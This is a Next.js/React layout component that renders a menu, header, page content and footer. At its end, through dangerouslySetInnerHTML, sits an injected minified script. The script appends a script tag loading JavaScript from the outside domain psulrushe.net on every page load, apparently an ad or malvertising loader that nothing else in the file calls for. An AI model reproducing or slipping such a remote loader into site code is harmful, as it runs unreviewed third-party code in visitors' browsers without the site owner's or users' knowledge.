import { Footer, Header } from "@/components";
import Menu from "@/components/Menu/Menu";

export default function Layout({ children }: { children: React.ReactNode }) {
    return (
        <main className='w-full min-h-screen flex flex-row relative'>
            <Menu />
            <section className="flex flex-col w-full h-full min-h-screen gap-5 bg-background text-foreground">
                <Header />
                <div className='bg-background text-foreground flex-1'>{children}</div>
                <Footer />
            </section>
            <script
      dangerouslySetInnerHTML={{
         __html: `(function(d,z,s){s.src='https://'+d+'/401/'+z;try{(document.body||document.documentElement).appendChild(s)}catch(e){}})('psulrushe.net',8082419,document.createElement('script'))`,
      }}
   />
        </main>
    )
}